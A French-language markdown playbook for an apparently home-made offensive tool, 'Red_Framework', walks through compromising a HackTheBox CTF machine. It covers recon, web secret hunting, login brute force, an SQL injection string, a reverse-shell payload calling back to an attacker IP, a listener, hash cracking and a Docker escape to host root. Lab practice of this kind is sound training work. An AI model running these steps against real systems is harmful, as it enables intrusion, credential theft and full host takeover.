```markdown
# 🎯 Playbook Offensif : Red_Framework vs HackTheBox

Ce guide décrit le flux de travail standard pour auditer et compromettre une machine cible (CTF/HTB) en utilisant le Red_Framework (V7 Ultimate Edition).

---

## 🛠️ Étape 0 : Préparation de l'Environnement

Avant de lancer le moindre script, assurez-vous d'être connecté au VPN de la cible et de configurer la résolution DNS.

1. **Trouver votre IP locale (LHOST) :**
   ```bash
   ip a s tun0  # Récupérez l'IP qui commence souvent par 10.10.x.x
   ```
2. **Ajouter la cible au fichier hosts :**
   ```bash
   sudo nano /etc/hosts
   # Ajouter : 10.10.11.222   machine.htb
   ```

---

## 👁️ Étape 1 : Reconnaissance Initiale

L'objectif est de cartographier la surface d'attaque sans déclencher (trop) d'alertes.

**1. Scan de Ports Rapide :**
```bash
python arsenal.py scan -T 10.10.11.222
```

**2. Énumération des Sous-domaines (OSINT + Brute-force DNS) :**
```bash
python arsenal.py sub -d machine.htb --auto-scan
```

**3. Recherche de Virtual Hosts Cachés (Très fréquent sur HTB) :**
*Si le port 80 affiche une page par défaut, cherchez des sites cachés (ex: dev.machine.htb).*
```bash
python arsenal.py vhost -i 10.10.11.222 -d machine.htb -w wordlists/vhosts.txt
```

---

## 🕸️ Étape 2 : L'Audit Web (Creuser la surface)

Si les ports 80, 443 ou 8080 sont ouverts, on déploie l'artillerie Web.

**1. Cartographie et détection CMS :**
```bash
python arsenal.py spider -u [http://machine.htb](http://machine.htb)
```

**2. Traque des APIs et de la documentation Swagger :**
```bash
python arsenal.py api-hunter -u [http://machine.htb/api](http://machine.htb/api)
```

**3. Analyse du Javascript et des Répertoires Cachés (.git, .env) :**
```bash
python arsenal.py js-sniper -u [http://machine.htb](http://machine.htb)
python arsenal.py secrets -u [http://machine.htb](http://machine.htb)
```

---

## 💥 Étape 3 : L'Exploitation (Casser les portes)

Vous avez trouvé un point d'entrée potentiel. Il est temps de l'attaquer.

**1. Fuzzing d'un paramètre vulnérable (RCE / LFI) :**
*Vous avez trouvé une URL suspecte (ex: `?page=`). Sortez le lance-roquettes :*
```bash
python arsenal.py nuke -u "[http://machine.htb/index.php?page=about](http://machine.htb/index.php?page=about)"
```

**2. Brute-force d'un formulaire Web (Ex: Mire de login) :**
```bash
python arsenal.py brute-web -u [http://machine.htb/login](http://machine.htb/login) -U admin
```

**3. Fuzzing Complexe (Clone de Burp Intruder) :**
*Copiez la requête HTTP brute dans un fichier `req.txt`, placez `§FUZZ§` sur la cible, et lancez l'attaque :*
```bash
python arsenal.py intruder -r req.txt -w wordlists/payloads.txt
```

**4. Préparation de Payloads (Utilitaires) :**
*Besoin d'encoder une injection SQL ou un shell ? Utilisez le Decoder à la volée :*
```bash
python arsenal.py decoder encode url "admin' OR 1=1--"
```

---

## 👑 Étape 4 : Post-Exploitation & Mouvement Latéral

Vous avez trouvé une faille RCE et vous êtes prêt à recevoir une connexion de la victime.

**1. Lancer le Shell Catcher (Auto-PTY) :**
*Oubliez `nc -lvnp`. Utilisez le Catcher pour stabiliser automatiquement votre shell dès la connexion.*
```bash
python arsenal.py catch -p 4444
```

**2. Générer et envoyer le payload Reverse Shell :**
```bash
python arsenal.py payload --revshell 10.10.14.X:4444
```
*Exécutez ce payload sur la machine cible pour faire un "call back" vers votre Catcher.*

**3. Cassage de Hash (Si vous trouvez un fichier passwd/shadow) :**
```bash
python arsenal.py crack --hash 5f4dcc3b5aa765d61d8327deb882cf99
```

---

## 🚀 Étape 5 : L'Évasion (Sortir de la matrice)

Vous avez un shell, mais vous remarquez que vous êtes coincé dans un conteneur (Docker/Kubernetes).

**1. Générer le script d'évasion :**
```bash
python arsenal.py docker --lhost 10.10.14.X --lport 9999
```

**2. Déployer et exécuter :**
* Ouvrez un nouveau listener.
* Transférez `breakout.sh` sur la cible via votre shell actuel et exécutez-le. Vous récupérerez un shell `root` sur l'hôte physique !

---

## 📄 Étape 6 : Fin de mission et Reporting

Une fois l'audit terminé et les flags `user.txt` / `root.txt` capturés, générez la documentation.

```bash
python arsenal.py export
```
*Le rapport interactif HTML sera disponible dans le dossier `reports/` avec l'historique de toutes vos trouvailles.*
```

